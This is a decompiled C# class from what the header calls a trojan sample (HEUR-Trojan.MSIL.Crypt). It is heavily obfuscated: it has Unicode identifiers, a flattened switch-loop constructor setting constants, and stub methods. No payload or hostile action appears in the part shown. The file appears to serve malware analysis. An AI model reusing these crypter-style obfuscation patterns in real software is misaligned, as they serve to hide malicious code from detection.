// Decompiled with JetBrains decompiler
// Type: @կ
// Assembly: uLqhNaw2rJQahaaHEibmS0F8CAhQ12f0pD0UHJWVCL, Version=9.1.2.0, Culture=neutral, PublicKeyToken=null
// MVID: D212B58E-19EB-4690-837D-62FC76EFC9D2
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Crypt.gen-c92d5d3e7959656b93039f2d0479f1cd50ca98907ea5aa0a925724b1dca475a3.exe

using System.Runtime.CompilerServices;

internal static class \u0040կ
{
  public static readonly int \u0040ӓ;
  public static readonly int \u0040Ӕ;
  public static readonly int \u0040ӕ;
  public static readonly int \u0040Ӗ;
  public static readonly int \u0040ӗ;
  public static readonly char \u0040Ә;
  public static readonly char \u0040ә;
  public static readonly int \u0040Ӛ;
  public static readonly int \u0040ӛ;
  public static readonly int \u0040Ӝ;
  public static readonly int \u0040ӝ;
  public static readonly int \u0040Ӟ;
  internal static readonly int \u0040ӟ;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static Su7TF2Wb6aoLQmQmn3g[][] \u0040Ӡ<Su7TF2Wb6aoLQmQmn3g>(int _param0, int _param1)
  {
    Su7TF2Wb6aoLQmQmn3g[][] tf2Wb6aoLqmQmn3gArray = new Su7TF2Wb6aoLQmQmn3g[_param0][];
    for (int index = 0; index < _param0; ++index)
      tf2Wb6aoLqmQmn3gArray[index] = new Su7TF2Wb6aoLQmQmn3g[_param1];
    return tf2Wb6aoLqmQmn3gArray;
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static \u0040կ()
  {
    int num = 2;
    while (true)
    {
      switch (num)
      {
        case 0:
          \u0040կ.\u0040Ә = char.MinValue;
          num = 7;
          continue;
        case 1:
        case 6:
          \u0040կ.\u0040ӓ = 100000;
          if (true)
          {
            num = 10;
            continue;
          }
          goto case 7;
        case 2:
          \u0040կ.\u0040ӡ();
          \u0040կ.\u0040ӣ();
          if (!\u0040կ.\u0040Ӣ())
          {
            num = 9;
            continue;
          }
          if (\u0040կ.\u0040Ӣ())
          {
            num = 6;
            continue;
          }
          goto case 8;
        case 3:
          \u0040կ.\u0040ӝ = 2 + 900000 / \u0040կ.\u0040ӛ;
          goto case 9;
        case 4:
          \u0040կ.\u0040ӕ = 9;
          num = 13;
          continue;
        case 5:
          \u0040կ.\u0040ӟ = 1000;
          num = 16;
          continue;
        case 7:
          \u0040կ.\u0040ә = '\u0001';
          goto case 15;
        case 8:
          \u0040կ.\u0040ӛ = 50;
          num = 11;
          continue;
        case 9:
        case 12:
          \u0040կ.\u0040Ӟ = 20;
          if (true)
          {
            num = 5;
            continue;
          }
          goto label_20;
        case 10:
          \u0040կ.\u0040Ӕ = 1;
          num = 4;
          continue;
        case 11:
          \u0040կ.\u0040Ӝ = 4;
          if (!\u0040կ.\u0040ӣ())
          {
            num = 3;
            continue;
          }
          goto case 1;
        case 13:
          \u0040կ.\u0040Ӗ = 258;
          num = 14;
          continue;
        case 14:
          \u0040կ.\u0040ӗ = 23;
          num = 0;
          continue;
        case 15:
          \u0040կ.\u0040Ӛ = 6;
          num = 8;
          continue;
        case 16:
          goto label_6;
        default:
          num = 15;
          continue;
      }
    }
label_6:
    return;
label_20:;
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u0040ӡ() => \u0040ո.\u0040Ӕ();

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static bool \u0040Ӣ() => true;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static bool \u0040ӣ() => false;
}
